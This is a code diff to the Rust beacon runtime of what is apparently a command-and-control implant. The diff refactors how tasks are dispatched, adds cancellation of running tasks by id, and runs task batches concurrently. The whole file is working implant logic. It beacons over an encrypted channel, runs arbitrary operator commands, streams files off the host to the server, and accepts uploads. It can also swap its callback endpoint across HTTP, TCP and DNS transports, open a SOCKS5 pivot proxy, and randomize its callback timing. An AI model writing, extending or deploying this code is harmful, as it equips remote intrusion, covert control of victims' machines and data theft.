@@ -1,5 +1,6 @@
+use std::collections::HashMap;
 use std::sync::atomic::{AtomicBool, Ordering};
-use std::sync::{Mutex, RwLock};
+use std::sync::{Arc, Mutex, RwLock};
 use std::time::Duration;
 
 use nw_profile::{
@@ -57,17 +58,21 @@ pub struct BeaconRuntime {
     pending: Mutex<Vec<TaskResult>>,
     download: RwLock<Option<Download>>,
     upload: RwLock<Option<crate::upload::Upload>>,
+    /// task id -> abort handle, for nw/killtask cancellation.
+    running: Mutex<HashMap<Uuid, tokio::task::AbortHandle>>,
     stop: AtomicBool,
 }
 
 impl BeaconRuntime {
     pub fn new(profile: Profile, psk: Vec<u8>) -> Self {
         let key = crypto::derive_key(&psk, b"nw-m1-salt");
-        let transport = Transport::from_endpoint(&profile.endpoint)
-            .unwrap_or_else(|e| {
-                tracing::warn!("bad endpoint {:?}: {e}", profile.endpoint);
-                Transport::Http { client: Default::default(), base: profile.endpoint.clone() }
-            });
+        let transport = Transport::from_endpoint(&profile.endpoint).unwrap_or_else(|e| {
+            tracing::warn!("bad endpoint {:?}: {e}", profile.endpoint);
+            Transport::Http {
+                client: Default::default(),
+                base: profile.endpoint.clone(),
+            }
+        });
         BeaconRuntime {
             profile,
             transport: RwLock::new(transport),
@@ -76,6 +81,7 @@ impl BeaconRuntime {
             pending: Mutex::new(Vec::new()),
             download: RwLock::new(None),
             upload: RwLock::new(None),
+            running: Mutex::new(HashMap::new()),
             stop: AtomicBool::new(false),
         }
     }
@@ -86,6 +92,20 @@ impl BeaconRuntime {
 
     pub fn should_stop(&self) -> bool {
         self.stop.load(Ordering::SeqCst)
+    }
+
+    /// Force-kill an in-flight task by task id. Returns true if a child was
+    /// terminated. The awaiting runner turns the killed child into a result.
+    pub async fn kill_task(&self, task_id: &Uuid) -> bool {
+        let handle = self.running.lock().unwrap().remove(task_id);
+        if let Some(handle) = handle {
+            // Aborting the task future drops the child, and kill_on_drop on
+            // the runner's Command terminates the process.
+            handle.abort();
+            true
+        } else {
+            false
+        }
     }
 
     pub fn set_endpoint(&self, url: String) -> Result<(), String> {
@@ -104,7 +124,10 @@ impl BeaconRuntime {
         let transport = self.transport.read().unwrap().clone();
         let key = { *self.key.read().unwrap() };
         let sealed = env.seal(&key).map_err(|e| AnyError(e.to_string()))?;
-        let raw = transport.exchange(sealed.as_bytes()).await.map_err(AnyError)?;
+        let raw = transport
+            .exchange(sealed.as_bytes())
+            .await
+            .map_err(AnyError)?;
         let wire = std::str::from_utf8(&raw).map_err(|e| AnyError(e.to_string()))?;
         Envelope::open(&key, wire).map_err(|e| AnyError(e.to_string()))
     }
@@ -126,15 +149,20 @@ impl BeaconRuntime {
         // The register handshake and its ack ride the PSK key; only after
         // deriving the DH session key does the volatile self.key switch over.
         let pt = serde_json::to_vec(&reg).map_err(|e| AnyError(e.to_string()))?;
-        let ct = crypto::encrypt(&self.session_key(), id, &pt).map_err(|e| AnyError(e.to_string()))?;
+        let ct =
+            crypto::encrypt(&self.session_key(), id, &pt).map_err(|e| AnyError(e.to_string()))?;
         let env = Envelope::new(Kind::Register, id, None, ct);
         let reply = self.exchange(&env).await?;
         if reply.kind != Kind::RegisterAck {
-            return Err(AnyError(format!("unexpected register reply kind {:?}", reply.kind)));
+            return Err(AnyError(format!(
+                "unexpected register reply kind {:?}",
+                reply.kind
+            )));
         }
         let ack_pt = crypto::decrypt(&self.session_key(), reply.id, &reply.encrypted)
             .map_err(|e| AnyError(e.to_string()))?;
-        let ack: RegisterAck = serde_json::from_slice(&ack_pt).map_err(|e| AnyError(e.to_string()))?;
+        let ack: RegisterAck =
+            serde_json::from_slice(&ack_pt).map_err(|e| AnyError(e.to_string()))?;
         // Derive the forward-secret session key from our ephemeral secret and
         // the server's ephemeral public key; every next frame uses this key.
         let server_pub = decode_key(&ack.server_pub).map_err(|e| AnyError(e.to_string()))?;
@@ -162,9 +190,8 @@ impl BeaconRuntime {
             let mut dl = self.download.write().unwrap();
             match dl.as_mut() {
                 Some(d) => {
-                    let chunks = d.step(budget);
                     // Wait for the completion ack before reporting done.
-                    chunks
+                    d.step(budget)
                 }
                 None => Vec::new(),
             }
@@ -180,9 +207,16 @@ impl BeaconRuntime {
         };
         let inner_budget = self.transport.read().unwrap().inner_budget();
 
-        let req = PollRequest { results, acked_ids: Vec::new(), file_chunks, upload_acks, inner_budget };
+        let req = PollRequest {
+            results,
+            acked_ids: Vec::new(),
+            file_chunks,
+            upload_acks,
+            inner_budget,
+        };
         let pt = serde_json::to_vec(&req).map_err(|e| AnyError(e.to_string()))?;
-        let ct = crypto::encrypt(&self.session_key(), id, &pt).map_err(|e| AnyError(e.to_string()))?;
+        let ct =
+            crypto::encrypt(&self.session_key(), id, &pt).map_err(|e| AnyError(e.to_string()))?;
         let env = Envelope::new(Kind::TaskResult, id, Some(sid), ct);
         let reply = self.exchange(&env).await?;
         let pt = crypto::decrypt(&self.session_key(), reply.id, &reply.encrypted)
@@ -199,7 +233,8 @@ impl BeaconRuntime {
                     self.pending.lock().unwrap().push(TaskResult {
                         task_id: d.task_id(),
                         ok: true,
-                        stdout: format!("downloaded {} bytes of {}", ack.received, d.size).into_bytes(),
+                        stdout: format!("downloaded {} bytes of {}", ack.received, d.size)
+                            .into_bytes(),
                         stderr: Vec::new(),
                         exit_code: 0,
                     });
@@ -235,210 +270,278 @@ impl BeaconRuntime {
         Ok(pr.tasks)
     }
 
-    /// Run returned tasks, buffering results for the next poll.
+    /// Run one returned task, buffering its result for the next poll. Also
+    /// handles the implanted local commands (`nw/*`). Sync wrapper; the unit
+    /// tests drive this directly, the beacon loop spawns it per task.
     async fn execute(&self, tasks: &[Task]) {
         for task in tasks {
-            if task.command == "nw/exit" {
-                self.trigger_stop();
-                continue;
-            }
-            if task.command == "nw/sethost" {
-                let result = match task.args.as_slice() {
-                    [url] => match self.set_endpoint(url.clone()) {
-                        Ok(()) => TaskResult {
-                            task_id: task.id,
-                            ok: true,
-                            stdout: format!("callback transport changed to {}", url).into_bytes(),
-                            stderr: Vec::new(),
-                            exit_code: 0,
-                        },
-                        Err(e) => TaskResult {
-                            task_id: task.id,
-                            ok: false,
-                            stdout: Vec::new(),
-                            stderr: format!(
-                                "invalid callback URL {url:?}; {e}; expected http(s)://, tcp://, gs://, dns:// with host"
-                            )
-                            .into_bytes(),
-                            exit_code: -1,
-                        },
+            self.run_one(task).await;
+        }
+    }
+
+    /// Run one returned task, buffering its result for the next poll. Also
+    /// handles the implanted local commands (`nw/*`).
+    async fn run_one(&self, task: &Task) {
+        if task.command == "nw/exit" {
+            self.trigger_stop();
+            return;
+        }
+        if task.command == "nw/sethost" {
+            let result = match task.args.as_slice() {
+                [url] => match self.set_endpoint(url.clone()) {
+                    Ok(()) => TaskResult {
+                        task_id: task.id,
+                        ok: true,
+                        stdout: format!("callback transport changed to {}", url).into_bytes(),
+                        stderr: Vec::new(),
+                        exit_code: 0,
                     },
-                    _ => TaskResult {
+                    Err(e) => TaskResult {
                         task_id: task.id,
                         ok: false,
                         stdout: Vec::new(),
-                        stderr: b"usage: nw/sethost <base-url>".to_vec(),
+                        stderr: format!(
+                            "invalid callback URL {url:?}; {e}; expected http(s)://, tcp://, gs://, dns:// with host"
+                        )
+                        .into_bytes(),
                         exit_code: -1,
                     },
-                };
-                self.pending.lock().unwrap().push(result);
-                continue;
-            }
-            if task.command == "nw/download" {
-                match task.args.as_slice() {
-                    [path] => {
-                        let mut slot = self.download.write().unwrap();
-                        if slot.is_some() {
-                            self.pending.lock().unwrap().push(TaskResult {
-                                task_id: task.id,
-                                ok: false,
-                                stdout: Vec::new(),
-                                stderr: b"a download is already in progress".to_vec(),
-                                exit_code: -1,
-                            });
-                        } else {
-                            match Download::open(path, task.id) {
-                                Ok(d) => {
-                                    // Stream in the background; the completion
-                                    // result is reported when the server acks.
-                                    *slot = Some(d);
-                                }
-                                Err(e) => self.pending.lock().unwrap().push(TaskResult {
-                                    task_id: task.id,
-                                    ok: false,
-                                    stdout: Vec::new(),
-                                    stderr: e.into_bytes(),
-                                    exit_code: -1,
-                                }),
-                            }
-                        }
-                    }
-                    _ => self.pending.lock().unwrap().push(TaskResult {
-                        task_id: task.id,
-                        ok: false,
-                        stdout: Vec::new(),
-                        stderr: b"usage: nw/download <path>".to_vec(),
-                        exit_code: -1,
-                    }),
-                }
-                continue;
-            }
-            if task.command == "nw/upload" {
-                match task.args.as_slice() {
-                    [dest] => {
-                        let mut slot = self.upload.write().unwrap();
-                        if slot.is_some() {
-                            self.pending.lock().unwrap().push(TaskResult {
-                                task_id: task.id,
-                                ok: false,
-                                stdout: Vec::new(),
-                                stderr: b"an upload is already in progress".to_vec(),
-                                exit_code: -1,
-                            });
-                        } else {
-                            match crate::upload::Upload::open(dest, task.id) {
-                                Ok(u) => *slot = Some(u),
-                                Err(e) => self.pending.lock().unwrap().push(TaskResult {
-                                    task_id: task.id,
-                                    ok: false,
-                                    stdout: Vec::new(),
-                                    stderr: e.into_bytes(),
-                                    exit_code: -1,
-                                }),
-                            }
-                        }
-                    }
-                    _ => self.pending.lock().unwrap().push(TaskResult {
-                        task_id: task.id,
-                        ok: false,
-                        stdout: Vec::new(),
-                        stderr: b"usage: nw/upload <dest>".to_vec(),
-                        exit_code: -1,
-                    }),
-                }
-                continue;
-            }
-            if task.command == "nw/socks" {
-                match task.args.as_slice() {
-                    [port] => match port.parse::<u16>() {
-                        Ok(p) => {
-                            let bind = format!("127.0.0.1:{p}");
-                            // Bind synchronously so we can report success/failure
-                            // to the operator, then run the accept loop detached.
-                            match tokio::net::TcpListener::bind(&bind).await {
-                                Ok(listener) => {
-                                    tokio::spawn(async move {
-                                        if let Err(e) = crate::socks5::run(listener).await {
-                                            tracing::warn!("socks5: {e}");
-                                        }
-                                    });
-                                    self.pending.lock().unwrap().push(TaskResult {
-                                        task_id: task.id,
-                                        ok: true,
-                                        stdout: format!("socks5 proxy listening on {bind}").into_bytes(),
-                                        stderr: Vec::new(),
-                                        exit_code: 0,
-                                    });
-                                }
-                                Err(e) => self.pending.lock().unwrap().push(TaskResult {
-                                    task_id: task.id,
-                                    ok: false,
-                                    stdout: Vec::new(),
-                                    stderr: format!("socks5 bind {bind}: {e}").into_bytes(),
-                                    exit_code: -1,
-                                }),
-                            }
-                        }
-                        Err(_) => self.pending.lock().unwrap().push(TaskResult {
+                },
+                _ => TaskResult {
+                    task_id: task.id,
+                    ok: false,
+                    stdout: Vec::new(),
+                    stderr: b"usage: nw/sethost <base-url>".to_vec(),
+                    exit_code: -1,
+                },
+            };
+            self.pending.lock().unwrap().push(result);
+            return;
+        }
+        if task.command == "nw/download" {
+            match task.args.as_slice() {
+                [path] => {
+                    let mut slot = self.download.write().unwrap();
+                    if slot.is_some() {
+                        self.pending.lock().unwrap().push(TaskResult {
                             task_id: task.id,
                             ok: false,
                             stdout: Vec::new(),
-                            stderr: b"usage: nw/socks <port>".to_vec(),
+                            stderr: b"a download is already in progress".to_vec(),
                             exit_code: -1,
-                        }),
-                    },
-                    _ => self.pending.lock().unwrap().push(TaskResult {
+                        });
+                    } else {
+                        match Download::open(path, task.id) {
+                            Ok(d) => {
+                                // Stream in the background; the completion
+                                // result is reported when the server acks.
+                                *slot = Some(d);
+                            }
+                            Err(e) => self.pending.lock().unwrap().push(TaskResult {
+                                task_id: task.id,
+                                ok: false,
+                                stdout: Vec::new(),
+                                stderr: e.into_bytes(),
+                                exit_code: -1,
+                            }),
+                        }
+                    }
+                }
+                _ => self.pending.lock().unwrap().push(TaskResult {
+                    task_id: task.id,
+                    ok: false,
+                    stdout: Vec::new(),
+                    stderr: b"usage: nw/download <path>".to_vec(),
+                    exit_code: -1,
+                }),
+            }
+            return;
+        }
+        if task.command == "nw/upload" {
+            match task.args.as_slice() {
+                [dest] => {
+                    let mut slot = self.upload.write().unwrap();
+                    if slot.is_some() {
+                        self.pending.lock().unwrap().push(TaskResult {
+                            task_id: task.id,
+                            ok: false,
+                            stdout: Vec::new(),
+                            stderr: b"an upload is already in progress".to_vec(),
+                            exit_code: -1,
+                        });
+                    } else {
+                        match crate::upload::Upload::open(dest, task.id) {
+                            Ok(u) => *slot = Some(u),
+                            Err(e) => self.pending.lock().unwrap().push(TaskResult {
+                                task_id: task.id,
+                                ok: false,
+                                stdout: Vec::new(),
+                                stderr: e.into_bytes(),
+                                exit_code: -1,
+                            }),
+                        }
+                    }
+                }
+                _ => self.pending.lock().unwrap().push(TaskResult {
+                    task_id: task.id,
+                    ok: false,
+                    stdout: Vec::new(),
+                    stderr: b"usage: nw/upload <dest>".to_vec(),
+                    exit_code: -1,
+                }),
+            }
+            return;
+        }
+        if task.command == "nw/socks" {
+            match task.args.as_slice() {
+                [port] => match port.parse::<u16>() {
+                    Ok(p) => {
+                        let bind = format!("127.0.0.1:{p}");
+                        // Bind synchronously so we can report success/failure
+                        // to the operator, then run the accept loop detached.
+                        match tokio::net::TcpListener::bind(&bind).await {
+                            Ok(listener) => {
+                                tokio::spawn(async move {
+                                    if let Err(e) = crate::socks5::run(listener).await {
+                                        tracing::warn!("socks5: {e}");
+                                    }
+                                });
+                                self.pending.lock().unwrap().push(TaskResult {
+                                    task_id: task.id,
+                                    ok: true,
+                                    stdout: format!("socks5 proxy listening on {bind}")
+                                        .into_bytes(),
+                                    stderr: Vec::new(),
+                                    exit_code: 0,
+                                });
+                            }
+                            Err(e) => self.pending.lock().unwrap().push(TaskResult {
+                                task_id: task.id,
+                                ok: false,
+                                stdout: Vec::new(),
+                                stderr: format!("socks5 bind {bind}: {e}").into_bytes(),
+                                exit_code: -1,
+                            }),
+                        }
+                    }
+                    Err(_) => self.pending.lock().unwrap().push(TaskResult {
                         task_id: task.id,
                         ok: false,
                         stdout: Vec::new(),
                         stderr: b"usage: nw/socks <port>".to_vec(),
                         exit_code: -1,
                     }),
-                }
-                continue;
+                },
+                _ => self.pending.lock().unwrap().push(TaskResult {
+                    task_id: task.id,
+                    ok: false,
+                    stdout: Vec::new(),
+                    stderr: b"usage: nw/socks <port>".to_vec(),
+                    exit_code: -1,
+                }),
             }
-            if task.command == "nw/hashes" {
-                match task.args.as_slice() {
-                    [path] => {
-                        let result = match tokio::fs::read(path).await {
-                            Ok(data) => {
-                                use sha2::{Digest, Sha256};
-                                let mut h = Sha256::new();
-                                h.update(&data);
-                                let digest = h.finalize();
-                                let hex: String =
-                                    digest.iter().map(|b| format!("{b:02x}")).collect();
-                                TaskResult {
-                                    task_id: task.id,
-                                    ok: true,
-                                    stdout: format!("{hex}  {path}").into_bytes(),
-                                    stderr: Vec::new(),
-                                    exit_code: 0,
-                                }
-                            }
-                            Err(e) => TaskResult {
+            return;
+        }
+        if task.command == "nw/hashes" {
+            match task.args.as_slice() {
+                [path] => {
+                    let result = match tokio::fs::read(path).await {
+                        Ok(data) => {
+                            use sha2::{Digest, Sha256};
+                            let mut h = Sha256::new();
+                            h.update(&data);
+                            let digest = h.finalize();
+                            let hex: String = digest.iter().map(|b| format!("{b:02x}")).collect();
+                            TaskResult {
                                 task_id: task.id,
-                                ok: false,
-                                stdout: Vec::new(),
-                                stderr: format!("hashes {path}: {e}").into_bytes(),
-                                exit_code: -1,
+                                ok: true,
+                                stdout: format!("{hex}  {path}").into_bytes(),
+                                stderr: Vec::new(),
+                                exit_code: 0,
+                            }
+                        }
+                        Err(e) => TaskResult {
+                            task_id: task.id,
+                            ok: false,
+                            stdout: Vec::new(),
+                            stderr: format!("hashes {path}: {e}").into_bytes(),
+                            exit_code: -1,
+                        },
+                    };
+                    self.pending.lock().unwrap().push(result);
+                }
+                _ => self.pending.lock().unwrap().push(TaskResult {
+                    task_id: task.id,
+                    ok: false,
+                    stdout: Vec::new(),
+                    stderr: b"usage: nw/hashes <path>".to_vec(),
+                    exit_code: -1,
+                }),
+            }
+            return;
+        }
+        if task.command == "nw/killtask" {
+            match task.args.as_slice() {
+                [id] => match Uuid::parse_str(id) {
+                    Ok(tid) => {
+                        let killed = self.kill_task(&tid).await;
+                        self.pending.lock().unwrap().push(TaskResult {
+                            task_id: task.id,
+                            ok: killed,
+                            stdout: if killed {
+                                format!("killed {tid}").into_bytes()
+                            } else {
+                                Vec::new()
                             },
-                        };
-                        self.pending.lock().unwrap().push(result);
+                            stderr: if killed {
+                                Vec::new()
+                            } else {
+                                format!("no running task {tid}").into_bytes()
+                            },
+                            exit_code: if killed { 0 } else { -1 },
+                        });
                     }
-                    _ => self.pending.lock().unwrap().push(TaskResult {
+                    Err(_) => self.pending.lock().unwrap().push(TaskResult {
                         task_id: task.id,
                         ok: false,
                         stdout: Vec::new(),
-                        stderr: b"usage: nw/hashes <path>".to_vec(),
+                        stderr: b"usage: nw/killtask <task-uuid>".to_vec(),
                         exit_code: -1,
                     }),
-                }
-                continue;
+                },
+                _ => self.pending.lock().unwrap().push(TaskResult {
+                    task_id: task.id,
+                    ok: false,
+                    stdout: Vec::new(),
+                    stderr: b"usage: nw/killtask <task-uuid>".to_vec(),
+                    exit_code: -1,
+                }),
             }
-            let result = runner::run(task.clone()).await;
-            self.pending.lock().unwrap().push(result);
+            return;
         }
+        let handle = runner::spawn_tracked(&self.running, task.clone());
+        match handle.await {
+            Ok(result) => self.pending.lock().unwrap().push(result),
+            Err(e) if e.is_cancelled() => {
+                self.pending.lock().unwrap().push(TaskResult {
+                    task_id: task.id,
+                    ok: false,
+                    stdout: Vec::new(),
+                    stderr: b"task cancelled".to_vec(),
+                    exit_code: -1,
+                });
+            }
+            Err(e) => {
+                self.pending.lock().unwrap().push(TaskResult {
+                    task_id: task.id,
+                    ok: false,
+                    stdout: Vec::new(),
+                    stderr: format!("task join error: {}", e).into_bytes(),
+                    exit_code: -1,
+                });
+            }
+        }
+        self.running.lock().unwrap().remove(&task.id);
     }
 
     fn session_key(&self) -> [u8; crypto::KEY_LEN] {
@@ -452,7 +555,7 @@ impl BeaconRuntime {
     }
 
     /// Own the beacon loop until signalled to stop.
-    pub async fn run(&self) -> anyhow::Result<()> {
+    pub async fn run(self: Arc<Self>) -> anyhow::Result<()> {
         loop {
             if self.should_stop() {
                 tracing::info!("implant stop requested");
@@ -475,7 +578,14 @@ impl BeaconRuntime {
             };
 
             match self.poll(sid).await {
-                Ok(tasks) => self.execute(&tasks).await,
+                // Run the batch detached so long-running and short tasks
+                // execute concurrently and polling never stalls behind a
+                // `sleep`-style in-flight command (cancellation needs the
+                // beacon loop to keep polling while a child runs).
+                Ok(tasks) => {
+                    let rt = Arc::clone(&self);
+                    tokio::spawn(async move { rt.execute(&tasks).await });
+                }
                 Err(e) => {
                     tracing::warn!("poll failed: {}", e);
                     *self.session_id.write().unwrap() = None;
@@ -536,6 +646,32 @@ mod tests {
         )
     }
 
+    #[test]
+    fn jittered_sleep_stays_within_the_configured_window() {
+        let mut runtime = runtime();
+        runtime.profile.interval = Duration::from_millis(100);
+        runtime.profile.jitter = Duration::from_millis(50);
+
+        for _ in 0..32 {
+            let delay = runtime.sleep();
+            assert!(delay >= Duration::from_millis(100));
+            assert!(delay < Duration::from_millis(150));
+        }
+    }
+
+    #[tokio::test]
+    async fn completed_task_is_removed_from_cancellation_registry() {
+        let runtime = runtime();
+        let task = Task {
+            id: Uuid::new_v4(),
+            command: "printf".into(),
+            args: vec!["done".into()],
+            timeout_ms: 1_000,
+        };
+        runtime.execute(std::slice::from_ref(&task)).await;
+        assert!(!runtime.kill_task(&task.id).await);
+    }
+
     #[tokio::test]
     async fn sethost_rejects_relative_endpoint_without_mutating_runtime() {
         let runtime = runtime();
@@ -546,7 +682,7 @@ mod tests {
             timeout_ms: 0,
         };
 
-        runtime.execute(&[task.clone()]).await;
+        runtime.execute(std::slice::from_ref(&task)).await;
 
         assert_eq!(
             runtime.transport.read().unwrap().describe(),
@@ -569,7 +705,7 @@ mod tests {
             timeout_ms: 0,
         };
 
-        runtime.execute(&[task.clone()]).await;
+        runtime.execute(std::slice::from_ref(&task)).await;
 
         assert_eq!(
             runtime.transport.read().unwrap().describe(),
@@ -592,7 +728,7 @@ mod tests {
             timeout_ms: 0,
         };
 
-        runtime.execute(&[task.clone()]).await;
+        runtime.execute(std::slice::from_ref(&task)).await;
 
         assert_eq!(
             runtime.transport.read().unwrap().describe(),
